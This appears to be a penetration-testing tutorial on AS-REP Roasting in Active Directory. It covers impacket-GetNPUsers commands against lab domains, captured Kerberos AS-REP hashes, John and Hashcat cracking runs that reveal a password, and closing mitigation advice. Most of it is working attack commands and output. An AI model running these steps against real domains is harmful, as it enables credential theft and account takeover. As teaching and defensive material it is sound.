AS-REP Roasting targets user accounts that have Kerberos pre-authentication disabled. When this setting is enabled, we can request an authentication ticket (AS-REQ) for any user without knowing their password, and the Domain Controller will respond with a ticket encrypted with the user's password hash that can be cracked offline.

## Without Domain Credentials

### 1. Basic AS-REP Roasting Against a Domain

```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
```

**Expected Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-08-28 03:34:57.412208  2019-09-23 07:09:47.931194  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e9482d5bf0f73ac9fa1503bb9efc7a7$fba90d2681d25c7bd18fdb2ef21d90627a5d3a8cd8d32ecb6dac790003147963a605b3b849f4116e6e3c407fc3aad12d65e5adfdf45e34bed5e4af10e2031322dad5d6c07341a768b8e6d783cca0c425463d26d51f7ca679a30b3853c50dafc016391bd2a5f385b191cfc54141be1f9b52b1daba8c80f07d057849bb111e4c26850c18e650f9f014fe5c417ee3b252593127910793591aa374dad95def7a1c7237b236ac14c0f6412b829500b33be4724fd834aced634fc8a66391fa5acd4b755aaac4d88eea76960133301fd9cc7afefcf680375cc4e8f6d84d3765d593fc2ce71babf6a111
```

### 2. Using a Userlist File

Sometimes you need to test multiple users to find those with pre-authentication disabled:

```bash
impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile valid_users.txt absolute.htb/
```

**Expected Output:**
```
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:5438512223427add62da2872b76be2a$4323cd1c9d678f48cead26538f29a8476d139877df7d5221db0a85a6d6ee299449886cf672e3e561bf3c15d69029d91a48144f63b2235e2dd846a3bdea6ef39452c3f2124944299276a8dc8fb18bbf677bcb218d718d3d252f661edd2c92cceb18d9a09427278a97a5c57c77862fc97acd52717d196312b8c33192e489c350f2911af4d81437c5b8f34a16efa19cae17b3a791a958fbdc467435158a7eaf3dcf6e2cf18b5fe0037ee643dd314ee2b24f553728a29e1a39ea4e66a26d4d67b3cbf7ba7a0dc03a4cf6149ae07a86fdbf76c5301b9540a2732c5da4e40ac34553625509148cfd9dc3acbaab83c1
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### 3. When You Need Credentials (Common Error)

If you encounter this error:
```
[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

It means you need valid credentials to query LDAP. Provide any valid domain user:

```bash
impacket-GetNPUsers corp.com/pete -dc-ip 192.168.239.70 -request
```

## Cracking AS-REP Hashes

### 4. Crack with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash.txt
```

**Expected Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:08 DONE (2023-08-28 03:34) 0.1225g/s 500705p/s 500705c/s 500705C/s s3xydc1..s3r1bu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### 5. Crack with Hashcat

```bash
sudo hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat Mode Reference:**
- `18200` - Kerberos 5 AS-REP etype 23 (RC4)
- `19600` - Kerberos 5 AS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)
- `19700` - Kerberos 5 AS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)

## Targeting a Specific User

### 7. Request AS-REP Hash for a Known User

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.10.10.175 -request
```

**Expected Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1f10619c9626850f91a7042739299d5e$14e3085118b090ead2f83a5db2b6a1162682b69e255cf0a68d27c9d1df2fe03aeb09c8698b995f47f0e2539a91e1bec898f856baf18a5e1170b8b96c9e15474aebc636bde5753cbd87de262666af1b86ab044684af81d7c54ce2c0854cf0e5fa3bf29df735043d28d0d4e0f663b7cadb21ad9498899f4dc53eea9f55356cfce40a1706d0c566b0e5fc22145fbb18caae2557492a13cae666ba0334a9b239c3eb0a52551754d2ef9f61f63b4647cb93f894c002e77332a9d4424074302ea68770be4bd80fc5cc819077285cbc6e0468ddfae63de5b3cc3edaaec0063007dea77044b49f80b78a05994f093d8957f899835924e9877954f2b27d90c09e506eefc4
```
## Prevention & Mitigation

1. **Enable Kerberos pre-authentication** for all user accounts (default setting)
2. **Identify accounts with pre-authentication disabled**:
   ```powershell
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
   ```
3. **Use strong passwords** for all accounts, especially service accounts
4. **Monitor Event ID 4768** for anomalous AS-REQ requests
5. **Implement Account Lockout policies** to slow down brute-force attempts